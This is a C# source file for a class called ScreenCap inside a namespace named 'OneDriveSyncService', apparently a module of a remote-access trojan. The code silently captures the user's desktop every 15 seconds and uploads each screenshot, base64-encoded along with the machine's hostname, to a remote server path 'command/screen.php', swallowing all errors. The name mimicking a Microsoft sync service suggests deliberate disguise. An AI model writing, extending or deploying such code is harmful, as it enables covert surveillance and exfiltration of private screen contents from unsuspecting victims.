using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Drawing.Imaging;
using System.Threading;
using System.Timers;
using System.Net;
using System.Collections.Specialized;

namespace OneDriveSyncService
{
    internal class ScreenCap
    {
        static WebClient webClient = new WebClient();
        static bool isStarted = false;
        static Bitmap bitmap;
        static MemoryStream memoryStream;
        static Graphics memoryGraphics;
        static Rectangle screenBounds;
        static string commands;
        static System.Timers.Timer timer = new System.Timers.Timer();
        static Thread th_CaptureDesktop;
        private static string _serverName;

        public static void InitClientDesktop(string serverName)
        {
            _serverName = serverName;
            timer.Interval = 15000;
            timer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
            timer.Enabled = true;
            timer.Start();
        }

        public static void StartDesktopCapture()
        {
            isStarted = true;
        }

        public static void StopDesktopCapture()
        {
            isStarted = false;
        }

        private static MemoryStream GetDesktop()
        {
            memoryStream = new MemoryStream(10000);
            try
            {
                screenBounds = Screen.PrimaryScreen.Bounds;
                bitmap = new Bitmap(screenBounds.Width, screenBounds.Height, PixelFormat.Format32bppArgb);
                memoryGraphics = Graphics.FromImage(bitmap);
                memoryGraphics.CopyFromScreen(screenBounds.X, screenBounds.Y, 0, 0, screenBounds.Size, CopyPixelOperation.SourceCopy);
            }
            catch (Exception)
            {

            }
            bitmap.Save(memoryStream, ImageFormat.Jpeg);
            return memoryStream;
        }

        static void OnTimedEvent(object sender, EventArgs e)
        {
            if (!isStarted) return;
            try
            {
                webClient.Headers.Clear();
                webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");

                NameValueCollection payload = new NameValueCollection
                {
                    { "name", Dns.GetHostName() },
                    { "screen", Convert.ToBase64String(GetDesktop().ToArray()) }
                };
;
                Uri uri = new Uri(new Uri(_serverName), "command/screen.php");
                webClient.UploadValues(uri, payload);
            }
            catch
            {

            }
        }
    }
}
